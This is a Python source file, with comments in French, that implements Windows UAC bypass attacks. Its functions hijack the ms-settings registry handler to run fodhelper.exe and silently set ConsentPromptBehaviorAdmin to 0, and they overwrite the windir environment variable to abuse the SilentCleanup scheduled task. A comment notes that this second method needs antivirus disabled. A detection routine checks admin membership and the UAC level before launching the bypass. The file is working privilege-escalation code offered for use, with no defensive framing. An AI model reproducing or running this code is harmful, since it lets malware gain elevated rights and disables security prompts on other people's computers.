
import os
import time

def bypass_uac_1():
	cmd = f"C:\Windows\System32\cmd.exe /k powershell.exe Set-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -value '0'"
	try:
		os.system(f'reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d "{cmd}" /f')
		os.system('reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f')
		os.popen('fodhelper.exe')
		time.sleep(10)
		os.popen("powershell \"Start-Process powershell -Verb runas 'taskkill /F /IM cmd.exe'\"")
		os.system('reg delete "HKCU\Software\Classes\.thm\" /f')
		os.system('reg delete "HKCU\Software\Classes\ms-settings\" /f')
		return True
	except:
		pass


def bypass_uac_2():
	#Necessite AV désactivé
	cmd = "C:\Windows\System32\cmd.exe &REM"
	os.system(f'reg add "HKCU\Environment" /v "windir" /d "{cmd}" /f') #On réécrit la variable d'env windir
	os.system('schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I')
	#Voir DLL hijack pour une meilleure réussite car flag par windows defender

def detect_uac():
	global bypass_uac
	try:
		username = os.environ['username']
		stream = os.popen(f'net user {username} | findstr Admin')
		output = stream.read()
		if len(output) != 0: #Si réponse alors il fait parti du grp admin
			print("Yeah Admin")
			get_uac = os.popen('powershell.exe (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA') 
			output_uac = get_uac.read()
			output_uac = int(output_uac)
			if output_uac == 1: #Regarde si UAC est activé
				print("UAC is enabled")
				#On veut connaitre le niveau de l'UAC
				uac_value = os.popen('powershell.exe (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin')
				output_uac_value = uac_value.read()
				output_uac_value = int(output_uac_value)
				print(output_uac_value)
				if output_uac_value == 2:
					return False
				elif output_uac_value == 0: 
					return True
				else:
					if bypass_uac_1():
						return True

			else:
				print("UAC not enabled\n no need to bypass")
				return True
			
		else:
			return False
			print("Not admin :/")
			
	except:
		quit()

